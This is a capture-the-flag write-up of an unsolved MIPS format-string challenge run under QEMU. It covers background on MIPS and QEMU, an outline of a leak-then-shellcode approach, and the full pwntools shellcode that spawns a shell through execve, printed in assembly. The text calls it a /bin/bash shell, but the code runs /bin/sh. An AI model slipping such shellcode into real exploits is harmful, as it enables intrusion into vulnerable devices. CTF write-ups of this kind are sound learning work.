**Binary Blast**

**Description**
nc 0.cloud.chals.io 12490

Ready for a blast from the past? Navigate the MIPS landscape and watch out for those sneaky format strings. Beware of fake flags—only the real one will do!

Author: LMS

**Writeup**

I did not end up solving this challenge due to lack of experience with pwn challenges. However, I did learn quite a bit from this challenge, especially about MIPS and QEMU. 

First things first, the challenge mentions two key terms that are crucial to this challenge: `format strings` and `MIPS`. The challenge provides a MIPS binary (`chall`) running on a remote server (with the `qemu-mips` binary). 

*MIPS*: MIPS (Microprocessor without Interlocked Pipeline Stages) is a RISC (Reduced Instruction Set Computing) architecture widely used in embedded systems and network devices. MIPS processors execute a streamlined set of instructions, which allows for efficient pipelining and performance. 

*QEMU*: QEMU (Quick Emulator) is a free and open-source emulator that can perform hardware virtualization. It is often used to emulate different CPU architectures, including MIPS.

Upon some research I found this repository with a MIPS exploit involving shellcode injection: https://github.com/w0lfzhang/mips_exploit/tree/master

I read through the PDFs, but I was unable to employ the proof of concept to this challenge.

After research and decompiling the `chall` binary, I believe that the exploit involves leaking memory using the format string vulnerability, injecting shellcode, and executing it to get the shell.

The format string vulnerability in this challenge was not conventional. Usually, the binary has outputs for the injected format strings. However, there was no output in our case. Had I had more experience with pwn, I would have spotted how to work around this hurdle.

Generating the shellcode can be done through the use of `shellcraft` from `pwntools`. I believe `shellcraft.mips.linux.sh()` should be sufficient for spawning a `/bin/bash` shell for this challenge.
Here is what the `shellcraft` shellcode looks like in assembly:
```assembly
    /* execve(path='//bin/sh', argv=['sh'], envp={}) */
    /* push b'//bin/sh\x00' */
    li $t1, 0x69622f2f
    sw $t1, -12($sp)
    li $t1, 0x68732f6e
    sw $t1, -8($sp)
    sw $zero, -4($sp)
    addiu $sp, $sp, -12
    add $a0, $sp, $0 /* mov $a0, $sp */
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00\x00' */
    ori $t1, $zero, 26739
    sw $t1, -4($sp)
    addiu $sp, $sp, -4
    slti $a1, $zero, 0xFFFF /* $a1 = 0 */
    sw $a1, -4($sp)
    addi $sp, $sp, -4 /* null terminate */
    li $t9, ~4
    not $a1, $t9
    add $a1, $sp, $a1
    sw $a1, -4($sp)
    addi $sp, $sp, -4 /* 'sh\x00' */
    add $a1, $sp, $0 /* mov $a1, $sp */
    /* push argument array [] */
    /* push b'\x00' */
    sw $zero, -4($sp)
    addiu $sp, $sp, -4
    slti $a2, $zero, 0xFFFF /* $a2 = 0 */
    sw $a2, -4($sp)
    addi $sp, $sp, -4 /* null terminate */
    add $a2, $sp, $0 /* mov $a2, $sp */
    /* setregs noop */
    /* call execve() */
    ori $v0, $zero, SYS_execve
    syscall 0x40404
```
